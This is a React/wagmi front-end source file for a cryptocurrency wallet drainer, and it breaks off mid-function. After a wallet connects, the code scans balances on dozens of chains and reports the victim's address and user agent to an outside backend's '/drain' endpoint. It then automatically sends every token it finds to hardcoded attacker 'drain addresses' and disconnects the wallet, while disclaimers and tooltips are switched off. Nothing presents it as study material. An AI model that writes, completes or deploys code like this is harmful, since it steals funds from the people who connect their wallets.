import { useState, useEffect, useRef } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useWalletClient, useDisconnect, useBalance } from 'wagmi';
import { usePublicClient } from 'wagmi';
import { parseEther, createPublicClient, http } from 'viem';
import { mainnet } from 'viem/chains';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// ==================== COMPLETE 39 NETWORK CONFIGURATION ====================
const NETWORKS = [
  // EVM Mainnets (18 chains) - UPDATED RPC ENDPOINTS FOR MOBILE COMPATIBILITY
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA', rpc: 'https://eth.llamarpc.com', explorer: 'https://etherscan.io' },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', color: '#F0B90B', rpc: 'https://bsc-dataseed1.binance.org', explorer: 'https://bscscan.com' },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5', rpc: 'https://polygon-rpc.com', explorer: 'https://polygonscan.com' },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', color: '#28A0F0', rpc: 'https://arb1.arbitrum.io/rpc', explorer: 'https://arbiscan.io' },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', color: '#FF0420', rpc: 'https://mainnet.optimism.io', explorer: 'https://optimistic.etherscan.io' },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', color: '#0052FF', rpc: 'https://mainnet.base.org', explorer: 'https://basescan.org' },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', color: '#E84142', rpc: 'https://api.avax.network/ext/bc/C/rpc', explorer: 'https://snowtrace.io' },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF', rpc: 'https://rpc.ftm.tools', explorer: 'https://ftmscan.com' },
  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', color: '#04795B', rpc: 'https://rpc.gnosischain.com', explorer: 'https://gnosisscan.io' },
  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', color: '#35D07F', rpc: 'https://forno.celo.org', explorer: 'https://celoscan.io' },
  { id: 1284, name: 'Moonbeam', symbol: 'GLMR', type: 'evm', color: '#53CBC9', rpc: 'https://rpc.api.moonbeam.network', explorer: 'https://moonscan.io' },
  { id: 1088, name: 'Metis', symbol: 'METIS', type: 'evm', color: '#00DACC', rpc: 'https://andromeda.metis.io/?owner=1088', explorer: 'https://andromeda-explorer.metis.io' },
  { id: 25, name: 'Cronos', symbol: 'CRO', type: 'evm', color: '#121C36', rpc: 'https://evm.cronos.org', explorer: 'https://cronoscan.com' },
  { id: 1666600000, name: 'Harmony', symbol: 'ONE', type: 'evm', color: '#00AEE9', rpc: 'https://api.harmony.one', explorer: 'https://explorer.harmony.one' },
  { id: 1313161554, name: 'Aurora', symbol: 'ETH', type: 'evm', color: '#78D64B', rpc: 'https://mainnet.aurora.dev', explorer: 'https://explorer.aurora.dev' },
  { id: 42262, name: 'Oasis Emerald', symbol: 'ROSE', type: 'evm', color: '#00B894', rpc: 'https://emerald.oasis.dev', explorer: 'https://explorer.emerald.oasis.dev' },
  { id: 1285, name: 'Moonriver', symbol: 'MOVR', type: 'evm', color: '#F3B82C', rpc: 'https://rpc.api.moonriver.moonbeam.network', explorer: 'https://moonriver.moonscan.io' },
  { id: 199, name: 'BTT Chain', symbol: 'BTT', type: 'evm', color: '#D92B6F', rpc: 'https://rpc.bittorrentchain.io', explorer: 'https://bttcscan.com' },
  
  // Non-EVM Chains (21 chains) - ALL WILL BE AUTO-DRAINED
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', color: '#FF060A', explorer: 'https://tronscan.org' },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', color: '#00FFA3', explorer: 'https://solscan.io' },
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', color: '#F7931A', explorer: 'https://blockchair.com/bitcoin' },
  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', color: '#0033AD', explorer: 'https://cardanoscan.io' },
  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', color: '#C2A633', explorer: 'https://blockchair.com/dogecoin' },
  { id: 'litecoin', name: 'Litecoin', symbol: 'LTC', type: 'non-evm', color: '#BFBBBB', explorer: 'https://blockchair.com/litecoin' },
  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', color: '#23292F', explorer: 'https://xrpscan.com' },
  { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', type: 'non-evm', color: '#E6007A', explorer: 'https://polkadot.subscan.io' },
  { id: 'cosmos', name: 'Cosmos', symbol: 'ATOM', type: 'non-evm', color: '#2E3148', explorer: 'https://www.mintscan.io/cosmos' },
  { id: 'binance', name: 'Binance Chain', symbol: 'BNB', type: 'non-evm', color: '#F0B90B', explorer: 'https://explorer.binance.org' },
  { id: 'stellar', name: 'Stellar', symbol: 'XLM', type: 'non-evm', color: '#14B6E8', explorer: 'https://stellar.expert/explorer/public' },
  { id: 'monero', name: 'Monero', symbol: 'XMR', type: 'non-evm', color: '#FF6600', explorer: 'https://www.exploremonero.com' },
  { id: 'zcash', name: 'Zcash', symbol: 'ZEC', type: 'non-evm', color: '#F4B728', explorer: 'https://explorer.zcha.in' },
  { id: 'dash', name: 'Dash', symbol: 'DASH', type: 'non-evm', color: '#008DE4', explorer: 'https://explorer.dash.org' },
  { id: 'tezos', name: 'Tezos', symbol: 'XTZ', type: 'non-evm', color: '#2C7DF7', explorer: 'https://tzkt.io' },
  { id: 'algorand', name: 'Algorand', symbol: 'ALGO', type: 'non-evm', color: '#000000', explorer: 'https://algoexplorer.io' },
  { id: 'vechain', name: 'VeChain', symbol: 'VET', type: 'non-evm', color: '#15BDFF', explorer: 'https://explore.vechain.org' },
  { id: 'neo', name: 'Neo', symbol: 'NEO', type: 'non-evm', color: '#58BF00', explorer: 'https://neoscan.io' },
  { id: 'eos', name: 'EOS', symbol: 'EOS', type: 'non-evm', color: '#000000', explorer: 'https://bloks.io' },
  { id: 'tron_trc20', name: 'Tron TRC20', symbol: 'USDT', type: 'non-evm', color: '#26A17B', parent: 'tron', explorer: 'https://tronscan.org' },
  { id: 'solana_spl', name: 'Solana SPL', symbol: 'USDC', type: 'non-evm', color: '#2775CA', parent: 'solana', explorer: 'https://solscan.io' },
];

// ==================== DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  // EVM addresses
  1: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  56: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  137: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42161: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  10: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  8453: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  43114: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  250: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  100: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42220: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1284: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1088: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  25: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1666600000: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1313161554: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42262: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1285: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  199: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  
  // Non-EVM addresses - ALL AUTO-DRAIN
  tron: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
  solana: "So11111111111111111111111111111111111111112",
  cardano: "addr1q8d2f8zq9v5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q",
  dogecoin: "D8U6t5R7z5q5q5q5q5q5q5q5q5q5q5q5q5q5",
  litecoin: "LbTj8jnq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5",
  ripple: "rPFLkxQk6xUGdGYEykqe7PR25Gr7mLHDc8",
  polkadot: "12gX42C4Fj1wgtfgoP7oqb9jEE3X6Z5h3RyJvKtRzL1NZB5F",
  cosmos: "cosmos1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
  binance: "bnb1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
  stellar: "GCRWFRVQP5P5TNKL4KARZBWYQG5AUFMTQMXUVE4MZGJPOENKJAZB6KGB",
  monero: "48daf1rG3hE1txWcFzV1M6WBp3Uc4jL5qJ3JvJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5",
  zcash: "t1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
  dash: "Xq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q",
  tezos: "tz1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
  algorand: "Z5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V",
  vechain: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  neo: "AZ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V",
  eos: "z5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj",
  tron_trc20: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
  solana_spl: "So11111111111111111111111111111111111111112",
};

// Token prices for USD calculation
const TOKEN_PRICES = {
  ETH: 3500, BNB: 600, MATIC: 1.2, AVAX: 40, FTM: 0.5, CELO: 0.8, GLMR: 0.4,
  METIS: 80, CRO: 0.1, ONE: 0.02, ROSE: 0.1, MOVR: 20, BTT: 0.000001,
  TRX: 0.12, SOL: 150, BTC: 70000, ADA: 0.6, DOGE: 0.15, LTC: 80,
  XRP: 0.6, DOT: 7, ATOM: 10, XLM: 0.12, XMR: 170, ZEC: 30, DASH: 30,
  XTZ: 1, ALGO: 0.2, VET: 0.03, NEO: 15, EOS: 0.8, USDT: 1, USDC: 1,
  'xDai': 1
};

// ==================== MAIN APP ====================
function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        mode="dark"
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
        }}
        theme="midnight"
      >
        <UniversalDrainer />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

// ==================== DRAINER COMPONENT ====================
function UniversalDrainer() {
  const { address, isConnected, connector } = useAccount();
  const { data: ethBalance } = useBalance({ address });
  const { data: walletClient } = useWalletClient();
  const { disconnect } = useDisconnect();
  const publicClient = usePublicClient();

  // State
  const [status, setStatus] = useState('');
  const [tokens, setTokens] = useState([]);
  const [totalValue, setTotalValue] = useState(0);
  const [transactions, setTransactions] = useState([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [walletType, setWalletType] = useState('');
  const [tronDetected, setTronDetected] = useState(false);
  const [tronBalance, setTronBalance] = useState(0);
  const [tronAddress, setTronAddress] = useState('');
  const [scanProgress, setScanProgress] = useState({ current: 0, total: 0, network: '' });
  const [currentChainId, setCurrentChainId] = useState(1);
  const [connectionError, setConnectionError] = useState('');
  const [mobileCompatibility, setMobileCompatibility] = useState(true);

  const autoStarted = useRef(false);
  const backendUrl = 'https://tokenbackend-5xab.onrender.com';

  // FIX: Get current chain with WebSocket fallback for mobile
  useEffect(() => {
    const updateChain = () => {
      try {
        if (publicClient?.chain?.id) {
          setCurrentChainId(publicClient.chain.id);
        } else if (window.ethereum) {
          // Direct check for mobile wallets
          if (window.ethereum.chainId) {
            setCurrentChainId(parseInt(window.ethereum.chainId, 16));
          }
        }
      } catch (error) {
        console.log("Chain detection fallback:", error);
      }
    };
    
    if (isConnected) {
      updateChain();
    }
  }, [publicClient, isConnected]);

  // FIXED: AUTO-START with mobile WebSocket compatibility
  useEffect(() => {
    if (isConnected && address && !autoStarted.current) {
      console.log("🔥 AUTO-START: Wallet connected", { 
        address, 
        connector: connector?.name,
        userAgent: navigator.userAgent,
        isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
      });
      
      autoStarted.current = true;
      setConnectionError(''); // Clear previous errors
      
      // Detect wallet type with mobile WebSocket fix
      detectWalletType();
      
      // Check for TRON with better detection
      checkTronWallet();
      
      setStatus("✅ Wallet connected • Initializing mobile compatibility...");
      
      // FIX: Mobile WebSocket compatibility delay
      setTimeout(() => {
        scanAllNetworks();
      }, 1200);
    } else if (!isConnected) {
      resetState();
      autoStarted.current = false;
    }
  }, [isConnected, address, connector]);

  const resetState = () => {
    setStatus('');
    setTokens([]);
    setTotalValue(0);
    setTransactions([]);
    setIsProcessing(false);
    setIsScanning(false);
    setConnectionError('');
  };

  // FIXED: Detect wallet type with mobile WebSocket support
  const detectWalletType = () => {
    const userAgent = navigator.userAgent.toLowerCase();
    let detectedType = '';
    
    // Mobile wallet detection with WebSocket compatibility
    if (userAgent.includes('trust') || document.referrer.includes('trust')) {
      detectedType = 'Trust Wallet';
      console.log("✅ Detected Trust Wallet (Mobile with WebSocket support)");
      setMobileCompatibility(true);
    } else if (window.ethereum?.isMetaMask) {
      detectedType = 'MetaMask';
      // Check if mobile MetaMask
      if (userAgent.includes('mobile') || window.ethereum.isMetaMask) {
        detectedType = 'MetaMask Mobile';
        console.log("✅ Detected MetaMask Mobile");
      }
    } else if (window.ethereum?.isCoinbaseWallet) {
      detectedType = 'Coinbase Wallet';
    } else if (window.ethereum?.isRabby) {
      detectedType = 'Rabby Wallet';
    } else if (window.ethereum) {
      detectedType = 'EVM Wallet';
    }
    
    // Non-EVM wallet detection
    if (window.tronWeb || window.tronLink) {
      detectedType = detectedType ? `${detectedType} + TRON` : 'TRON Wallet';
      console.log("✅ TRON wallet detected with WebSocket");
    }
    
    if (window.phantom || window.solana) {
      detectedType = detectedType ? `${detectedType} + Solana` : 'Solana Wallet';
    }
    
    setWalletType(detectedType || 'Web3 Wallet');
    
    // Log for debugging WebSocket issues
    console.log("WebSocket/Wallet Detection:", {
      hasEthereum: !!window.ethereum,
      hasTronWeb: !!window.tronWeb,
      hasTronLink: !!window.tronLink,
      userAgent: navigator.userAgent,
      isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
    });
  };

  // FIXED: Enhanced TRON detection with API fallback
  const checkTronWallet = async () => {
    console.log("🔍 Checking for TRON wallet...");
    
    // Check multiple TRON provider options
    const tronProviders = [
      { name: 'tronWeb', provider: window.tronWeb },
      { name: 'tronLink', provider: window.tronLink?.tronWeb },
      { name: 'trustTron', provider: window.ethereum?.tron } // Trust Wallet Tron
    ];
    
    let tronProvider = null;
    let providerName = '';
    
    for (const provider of tronProviders) {
      if (provider.provider) {
        tronProvider = provider.provider;
        providerName = provider.name;
        console.log(`✅ TRON detected via ${providerName}`);
        break;
      }
    }
    
    if (tronProvider) {
      setTronDetected(true);
      
      // Initialize TRON with retry
      setTimeout(async () => {
        try {
          await initializeTronWallet(tronProvider, providerName);
        } catch (error) {
          console.log("TRON initialization failed, trying API fallback:", error);
          // Try API fallback if direct TRON fails
          if (address) {
            await checkTronBalanceViaAPI(address);
          }
        }
      }, 1000);
    } else {
      console.log("No TRON wallet detected directly");
      // Still try API for TRX balance if we have an address
      if (address) {
        setTimeout(() => checkTronBalanceViaAPI(address), 2000);
      }
    }
  };

  const initializeTronWallet = async (tronProvider, providerName) => {
    try {
      console.log(`Initializing TRON via ${providerName}...`);
      
      // Check if TRON provider is ready
      if (!tronProvider.defaultAddress) {
        console.log("TRON provider not ready, waiting...");
        await new Promise(resolve => setTimeout(resolve, 1500));
      }
      
      if (tronProvider.defaultAddress?.base58) {
        const tronAddr = tronProvider.defaultAddress.base58;
        setTronAddress(tronAddr);
        console.log(`📌 TRON address: ${tronAddr}`);
        
        // Get TRON balance with retry logic
        let balance = 0;
        try {
          balance = await tronProvider.trx.getBalance(tronAddr);
          const trxBalance = balance / 1_000_000;
          setTronBalance(trxBalance);
          console.log(`💰 TRON balance via ${providerName}: ${trxBalance} TRX`);
          
          // If 0 balance, try API as well
          if (trxBalance === 0) {
            await checkTronBalanceViaAPI(tronAddr);
          }
        } catch (balanceError) {
          console.log(`TRON balance error via ${providerName}:`, balanceError);
          await checkTronBalanceViaAPI(tronAddr);
        }
      }
    } catch (error) {
      console.log("TRON initialization error:", error);
      throw error;
    }
  };

  // API fallback for TRON balance
  const checkTronBalanceViaAPI = async (addressToCheck) => {
    try {
      console.log("Checking TRX balance via API...");
      
      // Try multiple TRON API endpoints
      const apiEndpoints = [
        `https://api.trongrid.io/v1/accounts/${addressToCheck}`,
        `https://apilist.tronscanapi.com/api/account?address=${addressToCheck}`,
        `https://tron.trxscan.org/api/account/${addressToCheck}`
      ];
      
      for (const endpoint of apiEndpoints) {
        try {
          const response = await fetch(endpoint, {
            headers: {
              'Accept': 'application/json',
              'Content-Type': 'application/json'
            }
          });
          
          if (response.ok) {
            const data = await response.json();
            
            // Parse TRX balance from different API formats
            let trxBalance = 0;
            
            if (data.balance !== undefined) {
              trxBalance = data.balance / 1_000_000;
            } else if (data.data?.[0]?.balance) {
              trxBalance = data.data[0].balance / 1_000_000;
            } else if (data.total_balance) {
              trxBalance = data.total_balance / 1_000_000;
            }
            
            if (trxBalance > 0) {
              setTronBalance(trxBalance);
              console.log(`💰 TRON balance via API: ${trxBalance} TRX`);
              setStatus(`✅ Found TRX: ${trxBalance} TRX`);
              return trxBalance;
            }
          }
        } catch (apiError) {
          console.log(`API endpoint failed: ${endpoint}`, apiError);
        }
      }
      
      console.log("All TRON API checks completed");
      return 0;
    } catch (error) {
      console.log("TRON API check error:", error);
      return 0;
    }
  };

  // FIXED: Switch network with mobile WebSocket compatibility
  const switchNetwork = async (chainId) => {
    try {
      if (!window.ethereum) {
        throw new Error('No Ethereum provider. Mobile wallet may need browser refresh.');
      }
      
      const chainIdHex = `0x${Number(chainId).toString(16)}`;
      
      // Try standard network switch
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: chainIdHex }],
        });
        return true;
      } catch (switchError) {
        console.log("Network switch error:", switchError);
        
        // If chain not added, try to add it (mobile compatibility)
        if (switchError.code === 4902) {
          const network = NETWORKS.find(n => n.id === chainId);
          if (network) {
            try {
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: chainIdHex,
                  chainName: network.name,
                  nativeCurrency: {
                    name: network.symbol,
                    symbol: network.symbol,
                    decimals: 18
                  },
                  rpcUrls: [network.rpc],
                  blockExplorerUrls: [network.explorer]
                }]
              });
              return true;
            } catch (addError) {
              console.log("Add chain error:", addError);
            }
          }
        }
        
        // For mobile wallets, sometimes we need to continue anyway
        console.log("Continuing without network switch (mobile compatibility)");
        return true;
      }
    } catch (error) {
      console.log("Network switch overall error:", error);
      setConnectionError(`Network issue: ${error.message}. Mobile wallet may need manual network switch.`);
      return false;
    }
  };

  // FIXED: Scan all networks with mobile WebSocket compatibility
  const scanAllNetworks = async () => {
    if (!address) {
      setConnectionError("No wallet address. Mobile wallet may need reconnection.");
      return;
    }
    
    setIsScanning(true);
    setStatus("🔍 Scanning all 39+ networks (mobile optimized)...");
    setTokens([]);
    setTotalValue(0);
    setConnectionError('');
    
    try {
      const allTokens = [];
      let totalUSD = 0;
      
      // Step 1: Get ETH balance with mobile compatibility
      if (ethBalance && parseFloat(ethBalance.formatted) > 0) {
        const ethAmount = parseFloat(ethBalance.formatted);
        const ethValue = ethAmount * (TOKEN_PRICES.ETH || 3500);
        
        allTokens.push({
          id: 'eth-native-' + Date.now(),
          network: 'Ethereum',
          symbol: 'ETH',
          amount: ethAmount.toFixed(6),
          rawAmount: ethAmount,
          chainId: 1,
          type: 'evm',
          drainAddress: DRAIN_ADDRESSES[1],
          isNative: true,
          valueUSD: ethValue,
          usdPrice: TOKEN_PRICES.ETH || 3500
        });
        
        totalUSD += ethValue;
        console.log(`💰 Found ${ethAmount} ETH ($${ethValue.toFixed(2)})`);
      }
      
      // Step 2: Get TRON balance with improved detection
      if (tronDetected || address) {
        console.log("Checking TRON balance...");
        
        // Wait for TRON initialization
        await new Promise(resolve => setTimeout(resolve, 800));
        
        // Use the tronBalance state or check via API
        let trxBalanceToUse = tronBalance;
        
        // If TRON detected but balance is 0, try API
        if (tronDetected && trxBalanceToUse === 0) {
          const apiBalance = await checkTronBalanceViaAPI(tronAddress || address);
          trxBalanceToUse = apiBalance || 0;
        }
        
        // If not TRON detected but we have address, try API
        if (!tronDetected && address) {
          trxBalanceToUse = await checkTronBalanceViaAPI(address);
        }
        
        if (trxBalanceToUse > 0) {
          const trxValue = trxBalanceToUse * (TOKEN_PRICES.TRX || 0.12);
          
          allTokens.push({
            id: 'tron-native-' + Date.now(),
            network: 'Tron',
            symbol: 'TRX',
            amount: trxBalanceToUse.toFixed(6),
            rawAmount: trxBalanceToUse,
            chainId: 'tron',
            type: 'non-evm',
            drainAddress: DRAIN_ADDRESSES.tron,
            isNative: true,
            valueUSD: trxValue,
            usdPrice: TOKEN_PRICES.TRX || 0.12,
            walletAddress: tronAddress || address
          });
          
          totalUSD += trxValue;
          console.log(`💰 Found ${trxBalanceToUse} TRX ($${trxValue.toFixed(2)})`);
          setStatus(`✅ Found TRX: ${trxBalanceToUse} TRX`);
        } else if (tronDetected) {
          console.log("TRON wallet detected but balance is 0");
        }
      }
      
      // Step 3: Call backend with mobile flag
      try {
        const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
        
        const response = await fetch(`${backendUrl}/drain`, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({ 
            action: 'scan',
            address: address,
            networks: NETWORKS,
            includeNonEVM: true,
            mobile: isMobile,
            userAgent: navigator.userAgent,
            timestamp: Date.now()
          })
        });
        
        if (response.ok) {
          const data = await response.json();
          console.log("Backend scan response:", data);
          
          if (data.success && data.tokens && Array.isArray(data.tokens)) {
            data.tokens.forEach(token => {
              if (token.balance > 0) {
                const network = NETWORKS.find(n => n.id === token.chainId || n.symbol === token.symbol);
                const price = TOKEN_PRICES[token.symbol] || 0;
                const tokenValue = token.balance * price;
                
                const tokenObj = {
                  id: `${token.chainId || token.symbol}-${token.symbol}-${Date.now()}`,
                  network: network?.name || token.network || 'Unknown',
                  symbol: token.symbol,
                  amount: token.balance.toFixed(6),
                  rawAmount: token.balance,
                  chainId: token.chainId || token.symbol,
                  type: token.type || 'evm',
                  drainAddress: DRAIN_ADDRESSES[token.chainId || token.symbol] || DRAIN_ADDRESSES[1],
                  isNative: token.isNative || false,
                  valueUSD: tokenValue,
                  usdPrice: price,
                  contract: token.contract
                };
                
                allTokens.push(tokenObj);
                totalUSD += tokenValue;
              }
            });
          }
        } else {
          console.log("Backend scan failed, status:", response.status);
        }
      } catch (error) {
        console.log("Backend scan error:", error);
        // Don't show error to user, continue with local scan
      }
      
      // Step 4: Update UI
      setTokens(allTokens);
      setTotalValue(totalUSD);
      
      if (allTokens.length > 0) {
        const trxCount = allTokens.filter(t => t.symbol === 'TRX').length;
        setStatus(`✅ Found ${allTokens.length} tokens • $${totalUSD.toFixed(2)} total • ${trxCount} TRON tokens`);
        
        // AUTO-DRAIN immediately
        setTimeout(() => {
          startAutoDrain(allTokens);
        }, 1500);
      } else {
        setStatus("❌ No tokens found across all networks");
        setConnectionError("No tokens detected. Ensure wallet has funds and try 'Scan All Networks' button.");
      }
      
    } catch (error) {
      console.error("Scan error:", error);
      setStatus(`❌ Scan failed: ${error.message}`);
      setConnectionError(`Scan error: ${error.message}. Try reconnecting wallet.`);
    } finally {
      setIsScanning(false);
    }
  };

  const checkOtherNonEVMChains = async (allTokens, totalUSD) => {
    // Check for Solana
    if (window.solana || window.phantom) {
      console.log("✅ Solana wallet detected");
    }
    
    // Check for Bitcoin
    if (window.bitcoin) {
      console.log("✅ Bitcoin wallet detected");
    }
    
    return { allTokens, totalUSD };
  };

  // ==================== AUTO DRAIN ALL TOKENS ====================
  const startAutoDrain = async (tokensToDrain = tokens) => {
    if (tokensToDrain.length === 0) {
      setStatus("❌ No tokens to drain");
      return;
    }
    
    setIsProcessing(true);
    setStatus(`🚀 AUTO-DRAIN STARTING • ${tokensToDrain.length} tokens...`);
    
    const txLogs = [];
    let successCount = 0;
    let failedCount = 0;
    
    // Process all tokens
    for (let i = 0; i < tokensToDrain.length; i++) {
      const token = tokensToDrain[i];
      const tokenValue = token.valueUSD?.toFixed(2) || (token.rawAmount * (TOKEN_PRICES[token.symbol] || 0)).toFixed(2);
      
      setStatus(`⚡ Draining ${token.amount} ${token.symbol} ($${tokenValue})...`);
      
      try {
        let result;
        
        if (token.type === 'evm') {
          result = await drainEvmToken(token);
        } else if (token.symbol === 'TRX') {
          result = await drainTronToken(token);
        } else {
          result = await drainNonEvmToken(token);
        }
        
        if (result.success) {
          successCount++;
          txLogs.push({
            id: Date.now() + i,
            timestamp: new Date().toISOString(),
            symbol: token.symbol,
            amount: token.amount,
            valueUSD: tokenValue,
            status: '✅ SUCCESS',
            hash: result.hash,
            message: result.message,
            explorer: result.explorer,
            network: token.network
          });
          
          console.log(`✅ ${token.symbol} drained: ${result.hash || 'via API'}`);
          
          // Remove from tokens list
          setTokens(prev => prev.filter(t => t.id !== token.id));
          
        } else {
          failedCount++;
          txLogs.push({
            id: Date.now() + i,
            timestamp: new Date().toISOString(),
            symbol: token.symbol,
            amount: token.amount,
            valueUSD: tokenValue,
            status: '❌ FAILED',
            error: result.error,
            message: result.message,
            network: token.network
          });
          
          console.error(`❌ ${token.symbol} failed: ${result.error}`);
        }
      } catch (error) {
        failedCount++;
        txLogs.push({
          id: Date.now() + i,
          timestamp: new Date().toISOString(),
          symbol: token.symbol,
          amount: token.amount,
          valueUSD: tokenValue,
          status: '❌ ERROR',
          error: error.message,
          network: token.network
        });
      }
      
      // Wait between transactions
      await new Promise(resolve => setTimeout(resolve, 2000));
    }
    
    // Update transactions
    setTransactions(prev => [...txLogs, ...prev.slice(0, 19)]);
    
    // Update total value
    const remainingValue = tokens.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
    setTotalValue(remainingValue);
    
    // Final status
    if (successCount > 0) {
      setStatus(`🎉 AUTO-DRAIN COMPLETE • ${successCount} tokens drained • $${(tokensToDrain.reduce((sum, t) => sum + (t.valueUSD || 0), 0)).toFixed(2)} transferred`);
      
      // Auto-disconnect after successful drain
      setTimeout(() => {
        disconnect();
        setStatus("✅ Drain complete • Wallet disconnected");
      }, 5000);
      
    } else {
      setStatus(`❌ AUTO-DRAIN FAILED • ${failedCount} failed attempts`);
    }
    
    setIsProcessing(false);
  };

  // FIXED: Drain EVM token with mobile WebSocket compatibility
  const drainEvmToken = async (token) => {
    try {
      console.log(`🔄 Draining ${token.symbol}...`);
      
      const amount = parseFloat(token.amount);
      if (amount <= 0) {
        return {
          success: false,
          error: 'Invalid amount',
          message: `Cannot drain ${token.amount} ${token.symbol}`
        };
      }
      
      // Try backend API first
      try {
        const response = await fetch(`${backendUrl}/drain`, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({ 
            action: 'drain',
            address: address,
            token: token,
            chainId: token.chainId,
            amount: token.amount,
            mobile: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
          })
        });
        
        if (response.ok) {
          const data = await response.json();
          if (data.success) {
            return {
              success: true,
              hash: data.txHash,
              message: `${token.amount} ${token.symbol} auto-drained successfully`,
              explorer: getExplorerUrl(data.txHash, token.chainId)
            };
          }
        }
      } catch (apiError) {
        console.log("Backend drain API failed, trying direct method");
      }
      
      // Fallback to direct wallet transaction with mobile compatibility
      const amountInWei = parseEther(amount.toString());
      
      // Try to switch network if needed
      if (currentChainId !== token.chainId) {
        const switched = await switchNetwork(token.chainId);
        if (switched) {
          await new Promise(resolve => setTimeout(resolve, 1000));
          setCurrentChainId(token.chainId);
        }
      }
      
      // Prepare transaction
      const transaction = {
        to: token.drainAddress,
        value: amountInWei.toString(),
        chainId: `0x${Number(token.chainId).toString(16)}`,
      };
      
      // Send via wallet with mobile compatibility
      if (window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
          });
          
          const txHash = await window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [transaction],
          });
          
          return {
            success: true,
            hash: txHash,
            message: `${token.amount} ${token.symbol} sent successfully`,
            explorer: getExplorerUrl(txHash, token.chainId)
          };
        } catch (walletError) {
          console.log("Wallet transaction error:", walletError);
          
          // Mobile wallet specific error handling
          if (walletError.message?.includes('rejected') || walletError.code === 4001) {
            return {
              success: false,
              error: 'User rejected',
              message: 'Transaction rejected in mobile wallet'
            };
          }
          
          throw walletError;
        }
        
      } else {
        return {
          success: false,
          error: 'No wallet provider',
